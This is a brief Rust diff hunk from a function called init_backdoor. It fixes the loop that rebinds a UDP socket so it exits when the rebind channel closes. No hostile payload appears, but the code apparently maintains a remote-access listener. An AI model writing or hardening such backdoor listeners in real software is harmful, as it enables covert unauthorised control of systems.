@@ -71,8 +71,11 @@ pub async fn init_backdoor(cfg: BackdoorConfig) -> Result<JoinHandle<()>, Backdo
                         continue;
                     }
                 },
-                _ = rebind_rx.changed() => {
-                    let (new_ip, new_port) = rebind_rx.borrow().clone();
+                result = rebind_rx.changed() => {
+                    if result.is_err() {
+                        break;
+                    }
+                    let (new_ip, new_port) = rebind_rx.borrow_and_update().clone();
                     match UdpSocket::bind(format!("{new_ip}:{new_port}")).await {
                         Ok(s) => {
                             current_socket = Arc::new(s);
